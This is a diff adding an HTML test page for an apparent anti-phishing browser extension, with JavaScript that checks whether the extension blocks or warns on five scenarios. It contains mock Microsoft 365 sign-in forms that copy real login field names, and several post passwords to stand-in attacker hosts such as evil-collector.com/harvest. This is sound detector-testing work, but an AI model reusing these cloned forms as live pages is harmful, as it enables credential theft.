@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft 365 Protection - Phishing Scenario Tests</title>
+    <style>
+        body {
+            font-family: system-ui, -apple-system, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .scenario {
+            margin: 30px 0;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: #f9f9f9;
+        }
+        .scenario.high-risk {
+            border-color: #d32f2f;
+            background: #ffebee;
+        }
+        .scenario.medium-risk {
+            border-color: #ff9800;
+            background: #fff3e0;
+        }
+        .scenario.legitimate {
+            border-color: #4caf50;
+            background: #e8f5e8;
+        }
+        .test-button {
+            background: #1976d2;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 8px;
+            font-size: 14px;
+        }
+        .fake-form {
+            background: white;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        .fake-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .fake-form button {
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .status {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 4px;
+            font-weight: 500;
+        }
+        .status.detected {
+            background: #e8f5e8;
+            color: #2e7d32;
+            border: 1px solid #4caf50;
+        }
+        .status.not-detected {
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #f44336;
+        }
+        .status.info {
+            background: #e3f2fd;
+            color: #1565c0;
+            border: 1px solid #2196f3;
+        }
+    </style>
+</head>
+<body>
+    <h1>🛡️ Microsoft 365 Protection - Phishing Scenario Tests</h1>
+    <p>This page tests various phishing scenarios to ensure the extension detects them reliably.</p>
+
+    <!-- Scenario 1: High-Risk Domain with Microsoft Login -->
+    <div class="scenario high-risk">
+        <h2>Scenario 1: High-Risk Domain (Should be BLOCKED)</h2>
+        <p><strong>URL Pattern:</strong> secure-microsoft-login.com</p>
+        <p><strong>Expected:</strong> High threat detection with page blocking</p>
+        
+        <div class="fake-form">
+            <h3>Sign in to your account</h3>
+            <p>Microsoft 365</p>
+            
+            <form action="https://secure-microsoft-login.com/steal" method="POST">
+                <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" required>
+                <input type="password" name="passwd" placeholder="Password" required>
+                <button type="submit" id="idSIButton9">Sign in</button>
+            </form>
+        </div>
+        
+        <div id="scenario1-status" class="status info">Waiting for detection...</div>
+        <button class="test-button" onclick="testScenario(1)">Test Detection</button>
+    </div>
+
+    <!-- Scenario 2: Medium-Risk Content -->
+    <div class="scenario medium-risk">
+        <h2>Scenario 2: Phishing Content (Should show WARNING)</h2>
+        <p><strong>Content:</strong> Account verification with urgency tactics</p>
+        <p><strong>Expected:</strong> Medium threat detection with warning banner</p>
+        
+        <div class="fake-form">
+            <h3>Verify Your Account - Urgent Action Required</h3>
+            <p>Your Microsoft 365 account will be suspended unless you verify immediately.</p>
+            
+            <form action="/verify" method="POST">
+                <input type="email" name="loginfmt" placeholder="Email address" required>
+                <input type="password" placeholder="Password" required>
+                <button type="submit">Verify Account Now</button>
+            </form>
+            
+            <p><small>Click here to verify your Microsoft account before it's closed.</small></p>
+        </div>
+        
+        <div id="scenario2-status" class="status info">Waiting for detection...</div>
+        <button class="test-button" onclick="testScenario(2)">Test Detection</button>
+    </div>
+
+    <!-- Scenario 3: Sophisticated Phishing -->
+    <div class="scenario high-risk">
+        <h2>Scenario 3: Sophisticated Phishing (Should be BLOCKED)</h2>
+        <p><strong>Features:</strong> Microsoft elements + suspicious form action + missing legitimate elements</p>
+        <p><strong>Expected:</strong> High threat detection with blocking</p>
+        
+        <div class="fake-form">
+            <h3>Sign in to your account</h3>
+            <p>Microsoft</p>
+            
+            <form action="https://evil-collector.com/harvest" method="POST">
+                <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" required>
+                <input type="password" name="passwd" placeholder="Password" required>
+                <!-- Missing idPartnerPL and other legitimate elements -->
+                <button type="submit" id="idSIButton9">Sign in</button>
+            </form>
+            
+            <p><small>Can't access your account?</small></p>
+        </div>
+        
+        <div id="scenario3-status" class="status info">Waiting for detection...</div>
+        <button class="test-button" onclick="testScenario(3)">Test Detection</button>
+    </div>
+
+    <!-- Scenario 4: Borderline Case -->
+    <div class="scenario medium-risk">
+        <h2>Scenario 4: Borderline Case (Should show WARNING)</h2>
+        <p><strong>Features:</strong> Some Microsoft elements but missing key indicators</p>
+        <p><strong>Expected:</strong> Medium threat detection with warning</p>
+        
+        <div class="fake-form">
+            <h3>Office 365 Login</h3>
+            
+            <form action="/login" method="POST">
+                <input type="email" placeholder="Email address" required>
+                <input type="password" name="passwd" placeholder="Password" required>
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+        
+        <div id="scenario4-status" class="status info">Waiting for detection...</div>
+        <button class="test-button" onclick="testScenario(4)">Test Detection</button>
+    </div>
+
+    <!-- Scenario 5: Legitimate-looking with hidden elements -->
+    <div class="scenario high-risk">
+        <h2>Scenario 5: Hidden Legitimate Elements (Should be BLOCKED)</h2>
+        <p><strong>Features:</strong> Has some legitimate elements but form goes to wrong place</p>
+        <p><strong>Expected:</strong> High threat detection due to form action</p>
+        
+        <div class="fake-form">
+            <h3>Sign in to your account</h3>
+            <p>Microsoft 365</p>
+            
+            <form action="https://phishing-site.evil/collect" method="POST">
+                <input type="email" name="loginfmt" placeholder="Email, phone, or Skype" required>
+                <input type="password" name="passwd" placeholder="Password" required>
+                <input type="hidden" name="idPartnerPL" value="fake">
+                <button type="submit" id="idSIButton9">Sign in</button>
+            </form>
+            
+            <!-- Add some legitimate-looking content -->
+            <script>
+                // Fake legitimate content
+                var urlMsaSignUp = "fake";
+                var flowToken = "fake-token";
+            </script>
+        </div>
+        
+        <div id="scenario5-status" class="status info">Waiting for detection...</div>
+        <button class="test-button" onclick="testScenario(5)">Test Detection</button>
+    </div>
+
+    <!-- Test Results Summary -->
+    <div class="scenario">
+        <h2>Test Results Summary</h2>
+        <div id="test-summary" class="status info">Run individual tests to see results</div>
+        <button class="test-button" onclick="runAllTests()">Run All Tests</button>
+        <button class="test-button" onclick="clearAllResults()">Clear Results</button>
+    </div>
+
+    <script>
+        let testResults = {};
+        
+        function updateScenarioStatus(scenarioId, detected, expectedLevel, actualLevel = 'unknown') {
+            const statusElement = document.getElementById(`scenario${scenarioId}-status`);
+            if (!statusElement) return;
+            
+            const success = (expectedLevel === 'high' && (actualLevel === 'high' || detected)) ||
+                           (expectedLevel === 'medium' && (actualLevel === 'medium' || actualLevel === 'high' || detected)) ||
+                           (expectedLevel === 'none' && !detected);
+            
+            testResults[scenarioId] = {
+                detected: detected,
+                expected: expectedLevel,
+                actual: actualLevel,
+                success: success,
+                timestamp: new Date().toISOString()
+            };
+            
+            statusElement.className = `status ${success ? 'detected' : 'not-detected'}`;
+            statusElement.textContent = success ? 
+                `✅ PASS: Detection worked (Expected: ${expectedLevel}, Got: ${actualLevel || (detected ? 'detected' : 'not detected')})` :
+                `❌ FAIL: Detection failed (Expected: ${expectedLevel}, Got: ${actualLevel || (detected ? 'detected' : 'not detected')})`;
+            
+            updateTestSummary();
+        }
+        
+        function updateTestSummary() {
+            const summaryElement = document.getElementById('test-summary');
+            if (!summaryElement) return;
+            
+            const totalTests = Object.keys(testResults).length;
+            const passedTests = Object.values(testResults).filter(r => r.success).length;
+            const successRate = totalTests > 0 ? (passedTests / totalTests * 100).toFixed(1) : 0;
+            
+            summaryElement.className = `status ${successRate >= 80 ? 'detected' : 'not-detected'}`;
+            summaryElement.textContent = `Test Results: ${passedTests}/${totalTests} passed (${successRate}% success rate)`;
+        }
+        
+        function testScenario(scenarioId) {
+            // Clear any existing protection elements
+            document.querySelectorAll('[id^="ms365-"]').forEach(el => {
+                try {
+                    el.remove();
+                } catch {}
+            });
+            
+            // Wait a moment then check for protection elements
+            setTimeout(() => {
+                const protectionElements = document.querySelectorAll('[id^="ms365-"]');
+                const detected = protectionElements.length > 0;
+                
+                // Determine actual threat level based on protection elements
+                let actualLevel = 'none';
+                if (document.getElementById('ms365-block-overlay')) {
+                    actualLevel = 'high';
+                } else if (document.getElementById('ms365-warning-banner')) {
+                    actualLevel = 'medium';
+                } else if (document.getElementById('ms365-valid-badge')) {
+                    actualLevel = 'none';
+                }
+                
+                // Expected levels for each scenario
+                const expectedLevels = {
+                    1: 'high',    // High-risk domain
+                    2: 'medium',  // Phishing content
+                    3: 'high',    // Sophisticated phishing
+                    4: 'medium',  // Borderline case
+                    5: 'high'     // Hidden elements with bad form action
+                };
+                
+                updateScenarioStatus(scenarioId, detected, expectedLevels[scenarioId], actualLevel);
+                
+                console.log(`Scenario ${scenarioId} test:`, {
+                    detected: detected,
+                    protectionElements: protectionElements.length,
+                    actualLevel: actualLevel,
+                    expectedLevel: expectedLevels[scenarioId]
+                });
+                
+            }, 1000);
+        }
+        
+        async function runAllTests() {
+            for (let i = 1; i <= 5; i++) {
+                testScenario(i);
+                // Wait between tests to avoid interference
+                await new Promise(resolve => setTimeout(resolve, 1500));
+            }
+        }
+        
+        function clearAllResults() {
+            testResults = {};
+            
+            // Clear status displays
+            for (let i = 1; i <= 5; i++) {
+                const statusElement = document.getElementById(`scenario${i}-status`);
+                if (statusElement) {
+                    statusElement.className = 'status info';
+                    statusElement.textContent = 'Waiting for detection...';
+                }
+            }
+            
+            // Clear protection elements
+            document.querySelectorAll('[id^="ms365-"]').forEach(el => {
+                try {
+                    el.remove();
+                } catch {}
+            });
+            
+            updateTestSummary();
+        }
+        
+        // Monitor for protection elements being added
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                mutation.addedNodes.forEach((node) => {
+                    if (node.nodeType === Node.ELEMENT_NODE && node.id && node.id.startsWith('ms365-')) {
+                        console.log('Protection element detected:', node.id);
+                    }
+                });
+            });
+        });
+        
+        observer.observe(document.documentElement, {
+            childList: true,
+            subtree: true
+        });
+        
+        // Auto-run first test after page loads
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                console.log('Starting automatic test of Scenario 1...');
+                testScenario(1);
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
